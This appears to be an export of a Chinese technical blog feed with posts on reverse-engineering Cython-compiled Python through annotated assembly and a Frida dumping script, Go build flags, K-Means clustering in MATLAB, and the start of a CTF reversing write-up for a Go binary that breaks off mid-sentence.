class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs asm">v0 &#x3D; PyList_New(0LL);<br>PyList_Append(v1, __pyx_int_1);<br>PyList_Append(v1, __pyx_int_2);<br>......<br>PyList_Append(v1,  __pyx_n_s_five);<br><br>; for i in x: <br>;     print(i)<br>mov     rax, [rbx+18h]    &#x2F;&#x2F; 列表开始<br>mov     r15, [rax+r12*8]  &#x2F;&#x2F; r12 下标<br><br>; x &#x3D; x[1:]<br>call    _PyList_New<br>mov     rcx, rax<br>mov     rax, [rbp+var_38] ; var_38 是原来的 x<br>mov     r12, [rax+18h] ; 第一个 PyObect * 地址<br>lea     rsi, [r12+8] ; [1:] 跳过一个元素<br>mov     rdi, [rcx+18h]  ; __dst<br>lea     r15, [r13-1]<br>lea     rdx, ds:0[r15*8] ; __n r15 复制的元素的个数<br>call    _memcpy<br><br>;x[2:4] &#x3D; [22, 33]<br>;构造 [22, 33]<br>mov     edi, 2<br>call    _PyList_New<br>mov     r13, rax<br>mov     rax, cs:___pyx_int_22<br>mov     rcx, [r13+18h]<br>mov     [rcx], rax<br>mov     rax, cs:___pyx_int_33<br>mov     rcx, [r13+18h]<br>mov     [rcx+8], rax<br>mov     [rbp+var_40], rcx<br>; x[2:4] &#x3D; <br><br>;创建切片<br>mov     edi, 2          ; r12 &#x3D; _PyLong_FromSsize_t(2)<br>call    _PyLong_FromSsize_t<br>mov     r12, rax<br>mov     edi, 4          ; r15 &#x3D; _PyLong_FromSsize_t(4)<br>call    _PyLong_FromSsize_t<br>mov     r15, rax<br>mov     r13, cs:__Py_NoneStruct_ptr<br>mov     rdi, r12        ; start: 2<br>mov     rsi, rax        ; stop : 4<br>mov     rdx, r13        ; step __Py_NoneStruct_ptr<br>call    _PySlice_New<br>mov     [rbp+var_48], rax<br><br>;给切片赋值<br>mov r12, [rbp+var_48]<br>mov     rdi, rbx   ;o<br>mov     rsi, r12   ;key, 切片<br>mov     rdx, [rbp+var_38] ;v<br>mov     rax, [rbp+var_40]<br>call    qword ptr [rax+10h] ;mp_ass_subscript int PyObject_SetItem(PyObject *o, PyObject *key, PyObject *v)<br><br><br><br></code></pre></td></tr></table></figure><h2 id="test-dict-分析"><a href="#test-dict-分析" class="headerlink" title="test_dict() 分析"></a>test_dict() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_dict</span>():</span><br>    x = &#123;&#125;<br>    x[<span class="hljs-string">&quot;one&quot;</span>] = <span class="hljs-number">1</span><br>    x[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br>    x[<span class="hljs-string">&quot;three&quot;</span>] = <span class="hljs-number">3</span><br>    y = x[<span class="hljs-string">&quot;one&quot;</span>]<br>    z = x[<span class="hljs-string">&quot;two&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;one&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(y)<br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> x:<br>        print(k, x[k])<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs asm">; x &#x3D; &#123;&#125;<br>call    _PyDict_New<br>mov rbx, rax ; rbx &#x3D;&gt; x PyObject *<br><br>;  x[&quot;one&quot;] &#x3D; 1<br>mov     rsi, cs:___pyx_n_s_one ; key<br>mov     rdx, cs:___pyx_int_1 ; v<br>mov     rdi, rbx        ; o<br>call    _PyDict_SetItem ;int PyObject_SetItem(PyObject *o, PyObject *key, PyObject *v)<br><br>; x[&quot;two&quot;] &#x3D; 2<br>mov     rsi, cs:___pyx_n_s_two ; key<br>mov     rdx, cs:___pyx_int_2 ; item<br>mov     rdi, rbx        ; mp<br>call    _PyDict_SetItem<br><br>; x[&quot;three&quot;] &#x3D; 3<br>mov     rsi, cs:___pyx_n_s_three ; key<br>mov     rdx, cs:___pyx_int_3 ; item<br>mov     rdi, rbx        ; mp<br>call    _PyDict_SetItem<br><br>;  y &#x3D; x[&quot;one&quot;]<br>mov     rsi, cs:___pyx_n_s_one<br>mov     rdi, rbx<br>call    ___Pyx_PyDict_GetItem<br>mov     [rbp+var_40], rax<br><br>;  z &#x3D; x[&quot;two&quot;]<br>mov     rsi, cs:___pyx_n_s_two<br>mov     rdi, rbx<br>call    ___Pyx_PyDict_GetItem<br>mov     [rbp+var_38], rax<br><br>; if &quot;one&quot; in x<br>mov     rsi, cs:___pyx_n_s_one ; key<br>mov     rdi, rbx        ; mp<br>call    _PyDict_Contains ; key in mp retrun 1, not in return 0, error: -1<br><br><br>; for k in x<br>loop_start:<br>mov     rdi, rbx        ; o<br>lea     rsi, [rbp+pos]  ; pos<br>lea     rdx, [rbp+key]  ; key<br>lea     rcx, [rbp+value] ; value<br>call    _PyDict_Next ; int PyDict_Next(PyObject *p, Py_ssize_t *ppos, PyObject **pkey, PyObject **pvalue)<br>.......<br>call    ___Pyx_PyDict_GetItem<br>.......<br>call    _PyTuple_New<br>.....<br>call    _PyTuple_Pack<br>....<br>call print.<br>.....<br>call    _PyDict_Size<br>......<br></code></pre></td></tr></table></figure><h2 id="test-datetime-分析"><a href="#test-datetime-分析" class="headerlink" title="test_datetime () 分析"></a>test_datetime () 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_datetime</span>():</span><br>    x = datetime.datetime.now()<br>    print(x)<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov     rbx, cs:___pyx_n_s_datetime<br>mov     rdx, [rbx+18h]<br>mov     rsi, rbx<br>call    __PyDict_GetItem_KnownHash<br>mov     r15, rax<br><br>mov     rsi, cs:___pyx_n_s_datetime<br>mov     rdi, r15        ; PyObject *<br>call    _PyObject_GetAttr<br>mov     rbx, rax<br><br>mov     rsi, cs:___pyx_n_s_now ;now<br>mov     rdi, rbx<br>call    _PyObject_GetAttr<br>mov     r15, rax<br><br>mov     rsi, cs:___pyx_empty_tuple<br>mov     rdi, r15        ; callable_object<br>call    ___Pyx_PyObject_Call<br><br>........ print(x) 略 ........<br></code></pre></td></tr></table></figure><h2 id="test-format-分析"><a href="#test-format-分析" class="headerlink" title="test_format() 分析"></a>test_format() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_format</span>():</span><br>    x = <span class="hljs-number">1</span><br>    y = <span class="hljs-string">&quot;One&quot;</span><br>    z = <span class="hljs-string">&quot;%s is %d&quot;</span> % (y, x)<br>    print(z)<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov     r14, cs:___pyx_n_s_One<br>mov     edi, 1          ; __int64<br>call    _PyLong_FromLong<br>mov     r15, rax ; r15 &#x3D; _PyLong_FromLong(1)<br>mov     edi, 2          ; size<br>call    _PyTuple_New<br>mov     rbx, rax<br>mov     [rax+18h], r14 ; &quot;One&quot;<br>mov     [rax+20h], r15 ; 1<br><br>mov     rdi, cs:___pyx_kp_s_s_is_d ; %s is %d<br>mov     rsi, rax                   ; Tuple(&quot;One&quot;, 1)<br>call    _PyUnicode_Format<br><br></code></pre></td></tr></table></figure><h2 id="dump-PyObject"><a href="#dump-PyObject" class="headerlink" title="dump PyObject *"></a>dump PyObject *</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00007FFBC501B615 mov     rcx, rbx<br>.text:00007FFBC501B618 call    python38_PyObject_Str          <br>.text:00007FFBC501B618                                       <br>.text:00007FFBC501B61D mov     rcx, rax<br>.text:00007FFBC501B620 call    python38_PyUnicode_AsUTF8<br></code></pre></td></tr></table></figure><p>这样就可以得到 PyObject * 的字符串 dump 信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// frida -pid xxx</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DumpPyObject</span>(<span class="hljs-params">address</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (Process.arch === <span class="hljs-string">&quot;x64&quot;</span>) &#123;<br>        <span class="hljs-keyword">var</span> native_address = <span class="hljs-keyword">new</span> NativePointer(address);<br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = Process.findModuleByName(<span class="hljs-string">&quot;python38.dll&quot;</span>);<br>        <span class="hljs-keyword">var</span> PyObject_Str = <span class="hljs-keyword">new</span> NativeFunction(<span class="hljs-built_in">module</span>.findExportByName(<span class="hljs-string">&quot;PyObject_Str&quot;</span>), <span class="hljs-string">&quot;pointer&quot;</span>, [<span class="hljs-string">&quot;pointer&quot;</span>], <span class="hljs-string">&quot;win64&quot;</span>);<br>        <span class="hljs-keyword">var</span> PyUnicode_AsUTF8 = <span class="hljs-keyword">new</span> NativeFunction(<span class="hljs-built_in">module</span>.findExportByName(<span class="hljs-string">&quot;PyUnicode_AsUTF8&quot;</span>), <span class="hljs-string">&quot;pointer&quot;</span>, [<span class="hljs-string">&quot;pointer&quot;</span>], <span class="hljs-string">&quot;win64&quot;</span>);<br>        <span class="hljs-keyword">var</span> obj = PyObject_Str(native_address);<br>        <span class="hljs-keyword">var</span> p = PyUnicode_AsUTF8(obj);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;okkk..&quot;</span>);<br>        <span class="hljs-built_in">console</span>.log(p.readUtf8String());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[1] “The Basics of Cython” <a href="https://cython.readthedocs.io/en/latest/src/tutorial/cython_tutorial.html">https://cython.readthedocs.io/en/latest/src/tutorial/cython_tutorial.html</a></p><p>[2] “Object Protocol” <a href="https://docs.python.org/3/c-api/object.html">https://docs.python.org/3/c-api/object.html</a></p><p>[3] “Type Objects” <a href="https://docs.python.org/3/c-api/typeobj.html#c.PySequenceMethods.sq_item">https://docs.python.org/3/c-api/typeobj.html#c.PySequenceMethods.sq_item</a></p>]]></content>
    
    
    <categories>
      
      <category>PL_Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go notes</title>
    <link href="/2021/05/06/go-notes/"/>
    <url>/2021/05/06/go-notes/</url>
    
    <content type="html"><![CDATA[<h1 id="go-笔记"><a href="#go-笔记" class="headerlink" title="go 笔记"></a>go 笔记</h1><p>开一篇博客页面记录一下学习 go 过程中的一些小笔记, 遇到新的会继续更新</p><p>[TOC]</p><h2 id="1-编译时删除源码路径"><a href="#1-编译时删除源码路径" class="headerlink" title="1. 编译时删除源码路径"></a>1. 编译时删除源码路径</h2><img src="/2021/05/06/go-notes/image-20210506162809042.png" class="" title="image-20210506162809042"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span>.<span class="hljs-keyword">exe</span> build -trimpath<br>strip xxx<br></code></pre></td></tr></table></figure><h2 id="2-关闭编译优化"><a href="#2-关闭编译优化" class="headerlink" title="2. 关闭编译优化"></a>2. 关闭编译优化</h2><p>有时候想逆向一些语言特性的时候，最好关掉编译优化</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">-gcflags <span class="hljs-string">&quot;-N -l&quot;</span><br>比如: <span class="hljs-keyword">go</span> build -<span class="hljs-keyword">o</span> hw.<span class="hljs-keyword">exe</span> -gcflags <span class="hljs-string">&quot;-N -l&quot;</span> HelloWorld.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>develop</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cluster notes</title>
    <link href="/2021/04/23/Cluster-notes/"/>
    <url>/2021/04/23/Cluster-notes/</url>
    
    <content type="html"><![CDATA[<h1 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h1><p>简单记录一下聚类。</p><p>无监督学习：训练集没有标签，聚类就是一个典型的无监督学习应用。</p><img src="/2021/04/23/Cluster-notes/image-20210423162155480.png" class="" title="image-20210423162155480"><p>聚类算法可以把上图分类两个簇。</p><h2 id="K-Means-算法"><a href="#K-Means-算法" class="headerlink" title="K-Means 算法"></a>K-Means 算法</h2><p><strong>K-Means</strong> 是最普及的聚类算法，算法接受一个未标记的数据集，然后将数据聚类成不同的组。K-Means算法的思想很简单，对于给定的样本集，按照样本之间的距离大小，将样本集划分为K个簇。让簇内的点尽量紧密的连在一起，而让簇间的距离尽量的大。</p><p>例如我们想将数据分成 k 个分组，k-means 算法首先选择 k 个随机点，这 k 个随机点称为 <strong>聚类中心</strong>（<strong>cluster centroids</strong>）</p><p>每一个聚类中心相当于“分组”的中心，k-means 算法优化目标是最小化所有数据与聚类中心点距离的距离和。</p><p>K-means 算法是一个迭代算法，每一次迭代完成两件事情</p><ul><li>计算每个数据最近的聚类中心，即为聚类中心关联数据（优化目标1）</li><li>用聚类中心关联的数据点平均分布位置更新该聚类中心 （优化目标2）</li></ul><p>k-means 算法优化目标</p><h3 id="优化目标-1"><a href="#优化目标-1" class="headerlink" title="优化目标(1)"></a>优化目标(1)</h3><img src="/2021/04/23/Cluster-notes/image-20210423163657455.png" class="" title="image-20210423163657455"><p>$c^{(i)}$ 是第 i 个样本 $x^{(i)}$ 最近的聚类中心的下标,  $\mu_j$ 是第 j 个聚类中心的向量。</p><p>优化目标(1) 的目标是找一个 j 使得 $x^{(i)}$ 到该聚类中心 $\mu_j$ 的距离最短（换句话讲，就是找到离 $x^{(i)}$ 最近的聚类中心, 并将该聚类中心的下标对应的下标赋值给 $c^{(i)}$）</p><p>通俗点讲，为聚类中心关联数据向量</p><p>优化目标(1)的代码实现</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">idx</span> = <span class="hljs-title">findClosestCentroids</span><span class="hljs-params">(X, centroids)</span></span><br><span class="hljs-comment">%FINDCLOSESTCENTROIDS computes the centroid memberships for every example</span><br><span class="hljs-comment">%   idx = FINDCLOSESTCENTROIDS (X, centroids) returns the closest centroids</span><br><span class="hljs-comment">%   in idx for a dataset X where each row is a single example. idx = m x 1 </span><br><span class="hljs-comment">%   vector of centroid assignments (i.e. each entry in range [1..K])</span><br><span class="hljs-comment">%</span><br><br><span class="hljs-comment">% Set K</span><br>K = <span class="hljs-built_in">size</span>(centroids, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">% You need to return the following variables correctly.</span><br>idx = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(X,<span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>)<br>    a = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(centroids));<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(centroids, <span class="hljs-number">1</span>)<br>        a(<span class="hljs-built_in">j</span>, :) = X(<span class="hljs-built_in">i</span>, :);<br>    <span class="hljs-keyword">end</span><br>    distance = sum((a - centroids).^<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    [~, idx(<span class="hljs-built_in">i</span>)] = <span class="hljs-built_in">min</span>(distance);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% =============================================================</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure><h3 id="优化目标-2"><a href="#优化目标-2" class="headerlink" title="优化目标(2)"></a>优化目标(2)</h3><img src="/2021/04/23/Cluster-notes/image-20210423164317870.png" class="" title="image-20210423164317870"><p>优化目标(2) 的作用是优化聚类中心。 $\mu_k$ 表示聚类中心，$C_k$ 是一个集合，用来记录聚类中心 k 对应的关联数据的集合，$|C_k|$ 是集合中元素的个数。</p><p>优化目标(2) 的代码实现</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">centroids</span> = <span class="hljs-title">computeCentroids</span><span class="hljs-params">(X, idx, K)</span></span><br><span class="hljs-comment">%COMPUTECENTROIDS returns the new centroids by computing the means of the </span><br><span class="hljs-comment">%data points assigned to each centroid.</span><br><span class="hljs-comment">%   centroids = COMPUTECENTROIDS(X, idx, K) returns the new centroids by </span><br><span class="hljs-comment">%   computing the means of the data points assigned to each centroid. It is</span><br><span class="hljs-comment">%   given a dataset X where each row is a single data point, a vector</span><br><span class="hljs-comment">%   idx of centroid assignments (i.e. each entry in range [1..K]) for each</span><br><span class="hljs-comment">%   example, and K, the number of centroids. You should return a matrix</span><br><span class="hljs-comment">%   centroids, where each row of centroids is the mean of the data points</span><br><span class="hljs-comment">%   assigned to it.</span><br><span class="hljs-comment">%</span><br><br><span class="hljs-comment">% Useful variables</span><br>[m n] = <span class="hljs-built_in">size</span>(X);<br><br><span class="hljs-comment">% You need to return the following variables correctly.</span><br>centroids = <span class="hljs-built_in">zeros</span>(K, n);<br><br>sums = <span class="hljs-built_in">zeros</span>(K, n);<br>sums_counter = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(idx, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span> : <span class="hljs-built_in">size</span>(idx, <span class="hljs-number">1</span>)<br>    sums(idx(<span class="hljs-built_in">j</span>), :) = sums(idx(<span class="hljs-built_in">j</span>), :) + X(<span class="hljs-built_in">j</span>, :);<br>    sums_counter(idx(<span class="hljs-built_in">j</span>)) = sums_counter(idx(<span class="hljs-built_in">j</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span> : <span class="hljs-built_in">size</span>(sums, <span class="hljs-number">1</span>)<br>    sums(<span class="hljs-built_in">i</span>, :) = sums(<span class="hljs-built_in">i</span>, :) ./ sums_counter(<span class="hljs-built_in">i</span>);<br><span class="hljs-keyword">end</span><br><br>centroids = sums;<br><br><span class="hljs-comment">% =============================================================</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="随机初始化聚类中心"><a href="#随机初始化聚类中心" class="headerlink" title="随机初始化聚类中心"></a>随机初始化聚类中心</h3><p>k-means 结果对于初始的聚类中心选择非常敏感，在运行 k-means 算法之前，我们应该选择随机的聚类中心。一般随机选择 k 个数据点作为聚类中心。多次用随机初始化的聚类中心运行 k-means 算法，选择误差最小的为最优模型。这样可以避免迭代算法达到局部最优解。</p>]]></content>
    
    
    <categories>
      
      <category>ml</category>
      
    </categories>
    
    
    <tags>
      
      <tag>notes</tag>
      
      <tag>homework</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红明谷杯2021:Reverse</title>
    <link href="/2021/04/15/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF2021-Reverse/"/>
    <url>/2021/04/15/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF2021-Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="红明谷杯2021-Reverse"><a href="#红明谷杯2021-Reverse" class="headerlink" title="红明谷杯2021:Reverse"></a>红明谷杯2021:Reverse</h1><h2 id="g0"><a href="#g0" class="headerlink" title="g0"></a>g0</h2><p>golang 逆向题</p><h3 id="1-flag-长度-：-0x14"><a href="#1-flag-长度-：-0x14" class="headerlink" title="1. flag 长度 ： 0x14"></a>1. flag 长度 ： 0x14</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">call    fmt_Fscanf<br>mov     rax, [rsp+0A8h]<br>mov     rcx, [rax]<br>cmp     qword ptr [rax+8], 14h<br></code></pre></td></tr></table></figure><p>数据变化  null -&gt; AABBCCDDEEFFGGHHIIJJ</p><h3 id="2-Flag-乱序"><a href="#2-Flag-乱序" class="headerlink" title="2. Flag 乱序"></a>2. Flag 乱序</h3><p>测试输入：AABBCCDDEEFFGGHHIIJJ<br>乱序输出：CDDEEHIIJJFFGGHAABBC<br>还原时，对照位置还原即可。<br>数据变化: AABBCCDDEEFFGGHHIIJJ -&gt; CDDEEHIIJJFFGGHAABBC</p><h3 id="3-调用-main-Encode-对乱序结果编码"><a href="#3-调用-main-Encode-对乱序结果编码" class="headerlink" title="3. 调用 main_Encode 对乱序结果编码"></a>3. 调用 main_Encode 对乱序结果编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000000004CD3A5 mov     [rsp+0E0h+var_E0], rax ; slice.data<br>.text:00000000004CD3A9 mov     [rsp+0E0h+var_D8], rcx ; slice.len<br>.text:00000000004CD3AE mov     [rsp+0E0h+var_D0], rdx ; slice.cap<br>.text:00000000004CD3B3 call    main_Encode<br></code></pre></td></tr></table></figure><p>由调用时参数推断 main_Encode 传入的参数是 []string, 即 golang 的 slice 切片类型。<br>数据变化: CDDEEHIIJJFFGGHAABBC -&gt; jKbWKuiRNZVR9xFNfdv41ptrx85</p><h3 id="4-比较"><a href="#4-比较" class="headerlink" title="4. 比较"></a>4. 比较</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000000004CD58D mov     [rsp+58h+var_50], rcx<br>.text:00000000004CD592 mov     [rsp+58h+var_48], rax<br>.text:00000000004CD597 call    runtime_memequal<br></code></pre></td></tr></table></figure><p>数据变化: 2GVdudkYo2CBXoQii7gfpkjTc4gT 与 jKbWKuiRNZVR9xFNfdv41ptrx85 比较</p><p>-&gt; 2GVdudkYo2CBXoQii7gfpkjTc4gT 反推输入。</p><h3 id="5-main-Encode-流程"><a href="#5-main-Encode-流程" class="headerlink" title="5. main_Encode 流程"></a>5. main_Encode 流程</h3><h4 id="5-1-math-big-nat-setBytes"><a href="#5-1-math-big-nat-setBytes" class="headerlink" title="5.1 math_big_nat_setBytes"></a>5.1 math_big_nat_setBytes</h4><p>将输入字符串作为大整数（大端序，可以写个go测试）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">call    math_big_nat_setBytes<br></code></pre></td></tr></table></figure><p>x = math_big_nat_setBytes(intputflag)</p><h4 id="5-2-循环"><a href="#5-2-循环" class="headerlink" title="5.2 循环"></a>5.2 循环</h4><p>循环条件： math_big__ptr_Int_Cmp(x, 0) 即 x &gt; 0 才循环</p><p>循环体流程：<br>调用 math_big__ptr_Int_DivMod </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(z *Int)</span> <span class="hljs-title">DivMod</span><span class="hljs-params">(x, y, m *Int)</span> <span class="hljs-params">(*Int, *Int)</span></span> <br></code></pre></td></tr></table></figure><p>4个参数，在call math_big__ptr_Int_DivMod 程序点，栈数据如下:<br>rsp -&gt; z<br>rsp + 0x8 -&gt; x<br>rsp + 0x10 -&gt; y<br>rsp + 0x18 -&gt; m</p><p>rsp + 0x20 -&gt; 返回值1: x div y<br>rsp + 0x28 -&gt; 